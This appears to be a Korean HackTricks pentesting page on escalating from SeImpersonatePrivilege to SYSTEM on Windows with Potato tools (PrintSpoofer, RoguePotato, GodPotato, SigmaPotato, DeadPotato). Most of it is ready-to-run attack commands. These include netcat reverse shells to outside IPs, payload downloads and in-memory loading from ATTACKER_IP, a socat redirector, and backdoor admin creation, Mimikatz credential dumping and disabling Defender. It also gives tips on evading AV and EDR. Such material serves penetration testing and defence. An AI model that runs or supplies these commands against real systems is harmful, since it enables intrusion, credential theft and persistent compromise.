# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato는** Windows Server 2019 및 Windows 10 build 1809 이상에서 **작동하지 않습니다**. 하지만 [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)**를 사용하면 **동일한 권한을 활용해 `NT AUTHORITY\SYSTEM`** 수준의 액세스 권한을 얻을 수 있습니다. 이 [블로그 게시물](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)에서는 JuicyPotato가 더 이상 작동하지 않는 Windows 10 및 Server 2019 호스트에서 가장 권한을 악용하는 데 사용할 수 있는 `PrintSpoofer` 도구를 자세히 설명합니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> 2024–2025년에 자주 유지 관리되는 최신 대안으로 SigmaPotato(GodPotato의 fork)가 있습니다. 이 도구는 메모리 내/.NET reflection 사용과 확장된 OS 지원을 추가합니다. 아래의 간단한 사용법과 References의 저장소를 참조하세요.

배경 지식 및 수동 기법 관련 페이지:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 요구 사항 및 자주 발생하는 문제

아래의 모든 기법은 다음 권한 중 하나를 보유한 컨텍스트에서 가장 기능을 지원하는 권한 있는 서비스를 악용합니다.

- SeImpersonatePrivilege(가장 흔함) 또는 SeAssignPrimaryTokenPrivilege
- 토큰에 이미 SeImpersonatePrivilege가 있다면 높은 무결성 수준은 필요하지 않습니다(IIS AppPool, MSSQL 등의 여러 서비스 계정에서 일반적).

권한을 빠르게 확인하려면:

```cmd
whoami /priv | findstr /i impersonate
```

운영 참고 사항:

- 셸이 SeImpersonatePrivilege가 없는 제한된 토큰으로 실행되는 경우(일부 환경의 Local Service/Network Service에서 흔함), FullPowers로 계정의 기본 권한을 복구한 다음 Potato를 실행하세요. 예: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- 프로세스 토큰은 같은 서비스 계정이나 로그온 세션의 다른 토큰보다 권한이 적을 수 있습니다. 일부 구성에서는 같은 세션의 명명된 파이프 클라이언트가 SeImpersonatePrivilege가 있는 다른 토큰을 노출할 수 있지만, 서비스에 설정된 `RequiredPrivileges`와 `whoami /priv`는 서로 다른 내용을 설명하며 그런 토큰을 사용할 수 있다는 증거가 되지 않습니다. 가장(impersonation) 경로를 고려하기 전에 실제 토큰을 확인하세요.
- PrintSpoofer를 사용하려면 Print Spooler 서비스가 실행 중이어야 하며 로컬 RPC 엔드포인트(spoolss)를 통해 연결할 수 있어야 합니다. PrintNightmare 이후 Spooler가 비활성화된 강화 환경에서는 RoguePotato/GodPotato/DCOMPotato/EfsPotato를 우선 사용하세요.
- RoguePotato는 TCP/135에서 연결 가능한 OXID resolver가 필요합니다. 아웃바운드 연결이 차단된 경우 리다이렉터/포트 포워더를 사용하세요(아래 예제 참고). 사용 중인 빌드에서 지원하는 플래그를 확인하세요.
- EfsPotato/SharpEfsPotato는 MS-EFSR을 악용합니다. 파이프 하나가 차단되어 있다면 다른 파이프(lsarpc, efsrpc, samr, lsass, netlogon)를 시도하세요.
- RpcBindingSetAuthInfo 중 발생하는 오류 0x6d3은 일반적으로 알 수 없거나 지원되지 않는 RPC 인증 서비스를 의미합니다. 다른 파이프/전송 방식을 시도하거나 대상 서비스가 실행 중인지 확인하세요.
- DeadPotato 같은 “Kitchen-sink” 포크는 디스크에 파일을 쓰는 추가 페이로드 모듈(Mimikatz/SharpHound/Defender off)을 포함합니다. 따라서 간소화된 원본보다 EDR에 탐지될 가능성이 높습니다.

## 간단 데모

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

참고:
- 현재 콘솔에서 대화형 프로세스를 실행하려면 `-i`를, 한 줄 명령을 실행하려면 `-c`를 사용할 수 있습니다.
- Spooler 서비스가 필요합니다. 비활성화되어 있으면 실패합니다.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

[upstream 사용법](https://github.com/antonioCoco/RoguePotato#usage)에서 `-e`는 명령을 지정하고, `-l`은 로컬 resolver 포트를 선택하며, 선택 사항인 `-c`는 CLSID를 지정합니다. COM activation이 실행 파일 경로가 이미 변경된 서비스를 시작하면, 해당 서비스는 token impersonation과 관계없이 변경된 명령을 실행할 수 있습니다. 관찰된 SYSTEM 실행이 이 기법 때문이라고 판단하기 전에 서비스 설정을 확인하세요.

아웃바운드 135가 차단되어 있다면, redirector에서 socat을 사용해 OXID resolver를 우회하세요:<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato는 Spooler/BITS 대신 **PrintNotify** 서비스를 대상으로 하는 새로운 COM abuse primitive로, 2022년 말에 공개되었습니다. 바이너리는 PrintNotify COM server를 인스턴스화하고 가짜 `IUnknown`으로 교체한 다음, `CreatePointerMoniker`를 통해 권한이 높은 callback을 트리거합니다. **SYSTEM** 권한으로 실행되는 PrintNotify 서비스가 다시 연결되면, 프로세스는 반환된 token을 복제하고 제공된 payload를 전체 권한으로 실행합니다.<sup>[[13]](#references)</sup>

주요 작동 참고 사항:

* Print Workflow/PrintNotify 서비스가 설치되어 있으면 Windows 10/11 및 Windows Server 2012–2022에서 작동합니다. (PrintNightmare 이후 기존 Spooler가 비활성화되어 있어도 이 서비스는 존재합니다.)
* 호출 컨텍스트에 **SeImpersonatePrivilege**가 있어야 합니다. (일반적으로 IIS APPPOOL, MSSQL 및 예약된 작업의 서비스 계정에 부여됩니다.)
* 직접 명령을 전달하거나 대화형 모드를 사용하여 기존 콘솔에서 계속 작업할 수 있습니다. 예:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* 순수하게 COM 기반이므로 named-pipe listener나 외부 redirector가 필요하지 않아, Defender가 RoguePotato의 RPC 바인딩을 차단하는 호스트에서 바로 대체해 사용할 수 있습니다.

Ink Dragon 같은 공격자는 SharePoint에서 ViewState RCE를 확보한 직후 PrintNotifyPotato를 실행해 `w3wp.exe` worker에서 SYSTEM으로 권한을 올린 다음 ShadowPad를 설치합니다.<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

팁: 파이프 하나가 실패하거나 EDR이 차단하면, 지원되는 다른 파이프를 시도하세요.

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

참고:
- SeImpersonatePrivilege가 있으면 Windows 8/8.1–11 및 Server 2012–2022에서 작동합니다.
- 설치된 런타임에 맞는 바이너리를 가져오세요(예: 최신 Server 2022에서는 `GodPotato-NET4.exe`).
- 초기 실행 수단이 타임아웃이 짧은 webshell/UI라면, payload를 스크립트로 준비한 뒤 GodPotato에 실행하도록 요청하세요. 긴 인라인 명령을 사용하는 것보다 좋습니다.<sup>[[12]](#references)</sup>

쓰기 가능한 IIS 웹 루트에서 사용하는 빠른 스테이징 패턴:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato는 기본값이 RPC_C_IMP_LEVEL_IMPERSONATE인 서비스 DCOM 객체를 대상으로 하는 두 가지 변형을 제공합니다. 제공된 바이너리를 빌드하거나 사용한 뒤 명령을 실행하세요.

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (업데이트된 GodPotato 포크)

SigmaPotato는 .NET reflection을 통한 메모리 내 실행 및 PowerShell reverse shell 도우미와 같은 최신 편의 기능을 추가합니다.<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

2024–2025 빌드(v1.2.x)의 추가 기능:
- 내장 reverse shell 플래그 `--revshell` 및 1024자 PowerShell 제한 제거로, 긴 AMSI 우회 payload를 한 번에 실행할 수 있습니다.
- Reflection에 적합한 구문(`[SigmaPotato]::Main()`), 그리고 간단한 heuristic을 피하기 위한 `VirtualAllocExNuma()` 기반의 기초적인 AV 회피 기법.
- PowerShell Core 환경용으로 .NET 2.0을 대상으로 컴파일된 별도 `SigmaPotatoCore.exe`.

### DeadPotato (모듈을 포함한 2024년 GodPotato 재작업 버전)

DeadPotato는 GodPotato의 OXID/DCOM impersonation chain을 유지하면서 post-exploitation 도우미 기능을 내장해, operator가 추가 도구 없이 즉시 SYSTEM 권한을 얻고 persistence/수집 작업을 수행할 수 있게 합니다.<sup>[[15]](#references)</sup>

일반 모듈(모두 SeImpersonatePrivilege 필요):

- `-cmd "<cmd>"` — 임의의 명령을 SYSTEM 권한으로 실행합니다.
- `-rev <ip:port>` — 간편한 reverse shell.
- `-newadmin user:pass` — persistence를 위해 로컬 관리자 계정을 생성합니다.
- `-mimi sam|lsa|all` — Mimikatz를 드롭하고 실행해 자격 증명을 덤프합니다(디스크에 흔적을 남기며 탐지 가능성이 높음).
- `-sharphound` — SYSTEM 권한으로 SharpHound 수집을 실행합니다.
- `-defender off` — Defender 실시간 보호를 비활성화합니다(탐지 가능성이 매우 높음).

예제 한 줄 명령:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

추가 바이너리가 함께 제공되므로 AV/EDR 경고가 더 많이 발생할 수 있습니다. 은밀성이 중요하다면 더 가벼운 GodPotato/SigmaPotato를 사용하세요.

## References

- [1] [PrintSpoofer – Windows 10 및 Server 2019에서 가장 권한 악용하기](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [JuicyPotato는 이제 그만? 옛날이야기, RoguePotato를 만나보세요](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – 서비스 계정의 기본 토큰 권한 복원](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction으로 webroot에 연결해 RCE → FullPowers + GodPotato로 SYSTEM 획득](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice 매크로 → IIS webshell → GodPotato로 SYSTEM 획득](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Ink Dragon 내부: 은밀한 공격 작전의 릴레이 네트워크와 내부 동작 공개](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – post-ex 모듈이 내장된 GodPotato 재작업 버전](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
